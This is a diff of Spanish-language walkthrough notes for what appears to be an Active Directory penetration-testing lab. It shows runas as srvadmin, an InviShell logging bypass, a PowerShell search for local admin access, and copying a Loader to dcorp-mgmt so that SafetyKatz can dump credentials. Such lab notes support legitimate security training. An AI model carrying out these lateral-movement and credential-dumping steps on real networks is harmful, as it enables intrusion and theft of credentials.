@@ -632,18 +632,21 @@ runas /user:dcorp\srvadmin /netonly cmd
 
 Una vez dentro ejecutaremos una invishell
 ```shell
+[Administrator as srvadmin]
 C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
 ```
 
 Y buscaremos si el usuario srvadmin tiene privilegios de administrador en otras maquinas
 ```shell
+[Administrator as srvadmin]
 . C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
 ```
 ```shell
 Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local -Verbose
 ```
 
-Descubriendo que los tiene en adminsrv y mgmt
+Descubriendo que los tiene en *adminsrv* y *mgmt*
+
 Teniendo acceso de administrador local en esa maquina de dcorp-mgmt y sabemos que hay una sesión activa en esa maquina como es svcadmin usaremos SafetyKatz para extraer las credenciales de la maquina, copiando el Loader a dcorp-mgmt
 ```shell
 echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
